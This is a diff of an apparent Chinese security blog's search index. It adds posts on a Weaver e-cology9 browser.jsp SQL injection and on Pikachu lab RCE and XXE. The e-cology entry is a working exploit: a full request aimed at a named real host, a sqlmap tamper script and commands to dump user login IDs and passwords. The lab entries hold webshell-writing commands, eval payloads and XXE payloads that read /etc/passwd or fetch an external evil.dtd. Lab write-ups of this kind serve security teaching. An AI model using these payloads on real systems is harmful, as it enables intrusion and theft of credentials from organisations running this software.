@@ -375,6 +375,42 @@
       </categories>
   </entry>
   <entry>
+    <title>泛微e-cology9 browser.jsp SQL注入</title>
+    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
+
+<p>sql语句经过了三层全字符的url编码</p>
+<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
+<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
+<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-CSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
     <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
@@ -484,6 +520,61 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-RCE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
+    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
+<p>也叫做远程命令执行或远程代码执行</p>
+<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
+<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
+<p>比如log4j</p>
+<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110095547449.png" alt="image-20230110095547449"></p>
+<p>此时在服务器上执行的命令为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>然后将结果显示在前端</p>
+<p>于是我们可以构造命令拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+<p>&amp;&amp;就是“与”</p>
+<p><img src="/images/image-20230110095812452.png" alt="image-20230110095812452"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>
+
+<p>||就是“或”</p>
+<p><img src="/images/image-20230110095858437.png" alt="image-20230110095858437"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>
+
+<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接通过shell_exec执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤，所以可以造成拼接</p>
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110100607751.png" alt="image-20230110100607751"></p>
+<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>@表示忽略报错</p>
+<p>!表示“非”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>
+
+<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110101728753.png" alt="image-20230110101728753"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-SSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/</url>
     <content><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
@@ -550,55 +641,60 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-RCE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
-    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
-<p>也叫做远程命令执行或远程代码执行</p>
-<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
-<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
-<p>比如log4j</p>
-<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-XXE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
+    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
+<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
+<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230110095547449.png" alt="image-20230110095547449"></p>
-<p>此时在服务器上执行的命令为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>然后将结果显示在前端</p>
-<p>于是我们可以构造命令拼接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
-<p>&amp;&amp;就是“与”</p>
-<p><img src="/images/image-20230110095812452.png" alt="image-20230110095812452"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>
+<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
+<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
+<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
 
-<p>||就是“或”</p>
-<p><img src="/images/image-20230110095858437.png" alt="image-20230110095858437"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>
+<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
 
-<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>
+<p>不止这些，不同的语言支持的协议不同</p>
+<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
+<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>直接通过shell_exec执行系统命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>
+<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
-<p>没有任何过滤，所以可以造成拼接</p>
-<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230110100607751.png" alt="image-20230110100607751"></p>
-<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>@表示忽略报错</p>
-<p>!表示“非”</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
-<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230110101728753.png" alt="image-20230110101728753"></p>
+<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
+<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
+<p>则可能存在XXE漏洞</p>
+<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1270,66 +1366,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-XXE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
